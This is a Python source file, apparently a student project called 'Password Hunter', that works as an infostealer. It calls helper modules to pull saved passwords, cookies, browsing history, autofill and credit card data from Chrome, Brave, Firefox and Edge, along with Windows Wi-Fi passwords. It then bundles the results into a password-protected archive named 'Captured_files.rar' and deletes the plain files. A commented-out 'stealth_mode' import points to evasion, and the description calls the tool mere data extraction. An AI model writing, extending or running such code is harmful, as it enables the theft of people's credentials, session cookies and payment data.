# Project Title: Password Hunter
# Member 1: Kwitee D. Gaylah
# Member 2: Wend-Benedo Simeon ZONGO

#Project Description: A program that extracts data from windows apps and saves them txt files and compress them.

import chrome, firefox, edge, brave, win, os, subprocess

from zipfile import ZipFile
#from stealth_mode import stealth_mode

#Instances of classes in the imported files
chrome_obj = chrome.Chrome()
brave_obj = brave.Brave()

#call functions and methods from the chrome module
chrome_obj.passwords()
chrome_obj.cookies()
chrome_obj.history()
chrome_obj.web_data()

#call functions and methods from the brave module
brave_obj.passwords()

#directly calling functions from imported files that doesn't have classes
win.data_collect()
firefox.main()

try:
    edge_user_data = os.path.normpath(fr"{os.environ['USERPROFILE']}\AppData\Local\Microsoft\Edge\User Data")
    edge.get_edge_creds(edge_user_data, "Microsoft Edge")
except Exception as e:
    print(f"[E] {str(e)}")

def compress():
    try:
        # Prompt the user for a password and validate it
        while True:
            password = input("Enter a password to encrypt the archive: ")
            confirm_password = input("Confirm the password: ")
            if password == confirm_password:
                break
            else:
                print("Passwords do not match. Please try again.")
        
        # Create a list of the files to compress
        files = ["Edge_passwords.txt", "Windowns_WI-FI_Pass.txt", "chrome_passwords.txt", "chrome_cookies.txt", "chrome_autofill.txt", "chrome_credit_cards.txt", "chrome_search_history.txt", "chrome_web_history.txt", "firefox_passwords.txt", "brave_passwords.txt"]
        
        # Use WinRAR to create an encrypted archive
        command = ["C:\\Program Files\\WinRAR\\WinRAR.exe", "a", "-hp" + password, "Captured_files.rar"] + files
        subprocess.run(command, check=True)
        
        # Remove the original files
        for file in files:
            os.remove(file)
    except Exception as e:
        print(f"Error: {e}")

if __name__ == "__main__":
    compress()